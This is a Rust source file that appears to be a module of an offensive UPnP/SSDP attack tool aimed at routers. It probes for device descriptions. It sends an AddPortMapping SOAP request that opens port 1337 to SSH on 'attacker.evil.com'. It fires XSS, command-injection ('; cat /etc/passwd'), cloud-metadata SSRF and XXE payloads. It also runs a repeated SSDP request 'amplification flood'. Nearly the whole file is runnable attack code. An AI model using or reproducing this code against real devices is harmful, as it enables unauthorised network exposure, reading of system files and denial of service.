use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .unwrap_or_else(|_| Client::new())
}

pub async fn discover(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} UPnP/SSDP Discovery", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let resp = client.get(url).send().await?;
    let status = resp.status().as_u16();
    let body = resp.text().await.unwrap_or_default();

    if status == 200 && (body.contains("upnp") || body.contains("UPnP") || body.contains("ssdp")) {
        println!("  {} UPnP service detected", "[+]".green().bold());
    }

    let discovery_paths = [
        "/rootDesc.xml",
        "/xml/device_description.xml",
        "/gatedesc.xml",
        "/devicedesc.xml",
        "/IGD.xml",
    ];
    for path in &discovery_paths {
        let target = format!("{}{}", url.trim_end_matches('/'), path);
        if let Ok(r) = client.get(&target).send().await {
            let status = r.status().as_u16();
            let text = r.text().await.unwrap_or_default();
            if status == 200 && !text.is_empty() {
                println!(
                    "  {} {:30} — {} bytes",
                    "[+]".green().bold(),
                    path,
                    text.len()
                );
                if text.contains("deviceType") || text.contains("friendlyName") {
                    println!("    {} Device description exposed", "[!]".red().bold());
                }
            }
        }
    }

    Ok(())
}

pub async fn expose(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} UPnP Port Exposure Test", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let control_endpoints = [
        "/upnp/control/WANIPConn1",
        "/upnp/control/WANPPPConn1",
        "/upnp/control/Layer3Fwd1",
        "/soap",
    ];
    for ep in &control_endpoints {
        let target = format!("{}{}", url.trim_end_matches('/'), ep);
        match client
            .post(&target)
            .header("Content-Type", "text/xml")
            .body("<s:Envelope></s:Envelope>")
            .send()
            .await
        {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200 || status == 500 {
                    if text.contains("GetExternalIPAddress") || text.contains("AddPortMapping") {
                        println!(
                            "  {} {:35} — CONTROL ENDPOINT ACTIVE",
                            "[!]".red().bold(),
                            ep
                        );
                    } else {
                        println!("  {} {:35} — status={}", "[-]".dimmed(), ep, status);
                    }
                }
            }
            Err(_) => println!("  {} {:35} — error", "[-]".dimmed(), ep),
        }
    }

    let add_port = r#"<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body>
<u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
<NewRemoteHost></NewRemoteHost><NewExternalPort>1337</NewExternalPort>
<NewProtocol>TCP</NewProtocol><NewInternalPort>22</NewInternalPort>
<NewInternalClient>attacker.evil.com</NewInternalClient><NewEnabled>1</NewEnabled>
<NewPortMappingDescription>test</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration>
</u:AddPortMapping>
</s:Body>
</s:Envelope>"#;

    let target = format!("{}/upnp/control/WANIPConn1", url.trim_end_matches('/'));
    if let Ok(r) = client
        .post(&target)
        .header("Content-Type", "text/xml")
        .header(
            "SOAPAction",
            "\"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\"",
        )
        .body(add_port)
        .send()
        .await
    {
        let status = r.status().as_u16();
        if status == 200 {
            println!(
                "\n  {} Port mapping injection — SUCCESS",
                "[!]".red().bold()
            );
        }
    }

    Ok(())
}

pub async fn inject(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} UPnP SOAP Injection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let payloads = [
        (
            "XSS in description",
            r#"<NewPortMappingDescription><script>alert(1)</script></NewPortMappingDescription>"#,
        ),
        (
            "Command inject",
            r#"<NewInternalClient>; cat /etc/passwd</NewInternalClient>"#,
        ),
        (
            "SSRF via client",
            r#"<NewInternalClient>http://169.254.169.254/latest/meta-data/</NewInternalClient>"#,
        ),
        (
            "XXE inject",
            r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><NewInternalClient>&xxe;</NewInternalClient>"#,
        ),
    ];

    for (name, payload) in &payloads {
        let soap = format!(
            r#"<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">{}</u:AddPortMapping></s:Body></s:Envelope>"#,
            payload
        );
        let target = format!("{}/upnp/control/WANIPConn1", url.trim_end_matches('/'));
        match client
            .post(&target)
            .header("Content-Type", "text/xml")
            .header(
                "SOAPAction",
                "\"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\"",
            )
            .body(soap)
            .send()
            .await
        {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200 && !text.contains("error") {
                    println!("  {} {:20} — INJECTED", "[!]".red().bold(), name);
                } else {
                    println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn flood(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} UPnP/SSDP Amplification Flood", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let ssdp_payload = "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 5\r\nST: ssdp:all\r\n\r\n";
    let mut sent = 0u32;
    let mut errors = 0u32;

    for i in 0..200u32 {
        let target = if i % 2 == 0 {
            url.to_string()
        } else {
            format!("{}/ssdp", url.trim_end_matches('/'))
        };
        match client
            .post(&target)
            .header("Content-Type", "text/plain")
            .body(ssdp_payload)
            .send()
            .await
        {
            Ok(r) => {
                let status = r.status().as_u16();
                if status == 200 {
                    sent += 1;
                } else {
                    errors += 1;
                }
            }
            Err(_) => {
                errors += 1;
            }
        }
        if i % 50 == 0 && i > 0 {
            println!(
                "  {} Progress: {} sent, {} errors",
                "*".cyan(),
                sent,
                errors
            );
        }
    }

    println!(
        "\n  {} Results: {} sent, {} errors",
        "[*]".cyan().bold(),
        sent,
        errors
    );
    if sent > 150 {
        println!(
            "  {} Amplification possible — server responded to most requests.",
            "[!]".red().bold()
        );
    }

    Ok(())
}
